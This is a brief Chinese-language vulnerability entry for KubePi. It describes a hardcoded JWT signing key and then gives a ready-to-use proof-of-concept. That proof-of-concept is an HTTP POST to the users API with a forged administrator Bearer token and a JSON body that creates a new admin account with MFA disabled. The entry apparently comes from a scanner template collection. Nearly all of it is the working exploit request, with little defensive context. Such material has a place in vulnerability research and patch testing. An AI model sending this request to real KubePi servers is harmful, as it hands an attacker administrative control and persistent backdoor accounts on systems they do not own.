#### 影响范围

KubePi 

#### 漏洞概述

KubePi中存在JWT硬编码，攻击者通过硬编码可以获取服务器后台管理权限添加任意用户

#### 漏洞复现

新建一个用户

```
POST /kubepi/api/v1/users HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.127 Safari/537.36
accept: application/json
Accept-Encoding: gzip, deflate
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJuaWNrTmFtZSI6IkFkbWluaXN0cmF0b3IiLCJlbWFpbCI6InN1cHBvcnRAZml0MmNsb3VkLmNvbSIsImxhbmd1YWdlIjoiemgtQ04iLCJyZXNvdXJjZVBlcm1pc3Npb25zIjp7fSwiaXNBZG1pbmlzdHJhdG9yIjp0cnVlLCJtZmEiOnsiZW5hYmxlIjpmYWxzZSwic2VjcmV0IjoiIiwiYXBwcm92ZWQiOmZhbHNlfX0.XxQmyfq_7jyeYvrjqsOZ4BB4GoSkfLO2NvbKCEQjld8

{
  "authenticate": {
       "password": "{{randstr}}"
  },
  "email": "{{randstr}}@qq.com",
  "isAdmin": true,
  "mfa": {
          "enable": false
   },
  "name": "{{randstr}}",
  "nickName": "{{randstr}}",
  "roles": [
       "Supper User"
  ]
}
```

